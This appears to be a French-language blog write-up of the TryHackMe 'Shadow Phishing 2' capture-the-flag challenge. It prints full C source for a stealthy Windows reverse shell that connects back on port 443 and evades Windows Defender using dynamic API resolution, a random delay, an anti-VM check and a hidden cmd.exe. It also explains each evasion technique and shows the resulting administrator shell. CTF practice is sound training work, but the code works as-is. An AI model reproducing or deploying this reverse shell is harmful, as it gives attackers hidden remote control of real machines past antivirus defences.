---
title: TryHackMe - Shadow Phishing 2
date: 2025-03-29 23:20:45 -0400
description: Le challenge "Shadow Phishing 2" est la suite du premier challenge "Shadow Phishing" dans le Hackfinity Battle sur TryHackMe. Comme dans le premier défi, un email de Cipher (cipher@darknetmail.corp) à ShadowByte (shadowbyte@darknetmail.corp) demande la création d’un exécutable nommé SilentEdge Installer, qui doit fonctionner sur Windows 10 x64. Cependant, cette fois, l’email mentionne implicitement une phase plus avancée ("Phase 2"), et le challenge introduit une nouvelle contrainte, la présence de Windows Defender, qui doit être contourné pour que l’exécutable puisse s’exécuter sans être détecté.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking, AV]
image:
    path: https://i.ibb.co/JwP1s3yp/Design-sans-titre.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.




![Hacked](https://i.ibb.co/q344qJCP/a.png)

<h2 style="color: orange;">Resolution</h2>

Contrairement au premier challenge, où un `payload` généré par `msfvenom` suffisait, ici **Windows Defender** est actif, ce qui signifie qu’un `payload` brut serait immédiatement détecté. J’ai donc décidé d’utiliser un programme en C ecris par un amis RedTeamer pour créer un reverse shell furtif, en utilisant des techniques avancées comme la résolution dynamique des `API`, des délais aléatoires, et des vérifications `anti-VM` pour minimiser les chances de détection.

voici le programme `C` qui établit une connexion reverse shell vers mon IP (`10.6.8.193`) sur le port `443`, un port couramment utilisé pour le trafic `HTTPS`, ce qui peut aider à masquer la communication.


```c
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "ntdll")

typedef NTSTATUS (NTAPI *PNT_DELAY_EXEC)(BOOLEAN, PLARGE_INTEGER);

void stealth_connection() {
    if (GetTickCount() < 300000 || GetSystemMetrics(SM_REMOTESESSION)) return;

    // Dynamic API resolution
    HMODULE hWS2 = LoadLibraryA("ws2_32.dll");
    if (!hWS2) return;

    int (WINAPI *pWSAStartup)(WORD, LPWSADATA) = (int (WINAPI*)(WORD, LPWSADATA))GetProcAddress(hWS2, "WSAStartup");
    SOCKET (WINAPI *pWSASocket)(int, int, int, LPVOID, DWORD, DWORD) = (SOCKET (WINAPI*)(int, int, int, LPVOID, DWORD, DWORD))GetProcAddress(hWS2, "WSASocketA");
    int (WINAPI *pWSAConnect)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS) = (int (WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS))GetProcAddress(hWS2, "WSAConnect");

    if (!pWSAStartup || !pWSASocket || !pWSAConnect) {
        FreeLibrary(hWS2);
        return;
    }

    WSADATA wsa;
    if (pWSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        FreeLibrary(hWS2);
        return;
    }

    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(443),
        .sin_addr.s_addr = inet_addr("$ip")  // Fixing the IP byte order
    };

    // Random delay
    HMODULE hNTDLL = GetModuleHandleA("ntdll.dll");
    PNT_DELAY_EXEC pNtDelay = (PNT_DELAY_EXEC)GetProcAddress(hNTDLL, "NtDelayExecution");
    if (pNtDelay) {
        LARGE_INTEGER interval = {.QuadPart = -((GetCurrentProcessId() % 5 + 1) * 10000000)};
        pNtDelay(FALSE, &interval);
    }

    SOCKET sock = pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        FreeLibrary(hWS2);
        return;
    }

    if (pWSAConnect(sock, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) == 0) {
        STARTUPINFOA si = { .cb = sizeof(si), .dwFlags = STARTF_USESTDHANDLES };
        PROCESS_INFORMATION pi;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        char cmd[] = "cmd.exe";  // Fixed
        if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(sock);
    FreeLibrary(hWS2);
}

// Proper Windows entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 0;  // Anti-VM check

    stealth_connection();
    return 0;
}
```

D'apres l'Intelligence Artificielle, Ce code utilise plusieurs techniques pour contourner Windows Defender :
1. **Résolution dynamique des API** : Les fonctions comme `WSAStartup`, `WSASocket`, et `WSAConnect` sont résolues dynamiquement avec `GetProcAddress`, ce qui évite d’avoir des appels statiques facilement détectables.
2. **Délai aléatoire** : Un délai est introduit avec `NtDelayExecution` pour éviter les comportements suspects immédiats
3. **Anti-VM** : Une vérification sur le nombre de processeurs (`si.dwNumberOfProcessors < 2`) permet de ne pas exécuter le `payload` dans un environnement de test ou une VM.
4. **Port 443** : La connexion utilise le port `443` pour se fondre dans le trafic `HTTPS`.
5. **Exécution discrète** : Le processus `cmd.exe` est lancé sans fenêtre `CREATE_NO_WINDOW` pour rester furtif.

- **Soumission et réception du reverse shell**

Après avoir compilé le payload en `.exe`, je l’ai soumis via l’email pour le **dead drop**. J’ai ensuite configuré un listener avec `netcat` sur le port `443` pour recevoir la connexion reverse shell :

![Reverse](https://i.ibb.co/GfXmZn6f/r.png)

La connexion a été établie depuis `l’IP` de la machine cible (`10.10.254.5`) vers mon IP (`10.6.8.193`) sur le port `443`. La commande `whoami` a confirmé que j’avais un shell avec les privilèges de l’utilisateur `fisher\administrator`, ce qui signifie un accès administrateur.



Pour confirmer que Windows Defender était actif et que mon payload l’avait bien contourné, j’ai exécuté la commande suivante dans le shell :


```console
C:\Windows\system32>sc query windefend
sc query windefend

SERVICE_NAME: windefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Windows\system32>
```
La sortie montre que le service `windefend` (**Windows Defender**) était en état `RUNNING`, ce qui signifie que l’antivirus était actif. Malgré cela, mon exécutable n’a pas été détecté, grâce aux techniques d’obfuscation utilisées dans le code.






<h2 style="color: orange;">Ressources supplementaires</h2>
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [AV Bypass RedTeam](https://www.ired.team/offensive-security/defense-evasion)
- [AV Explained](https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/)
- **Love my artciles?** Follow me on [Twitter](https://x.com/@bloman19) and [Github](https://github.com/0xabdoulaye)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
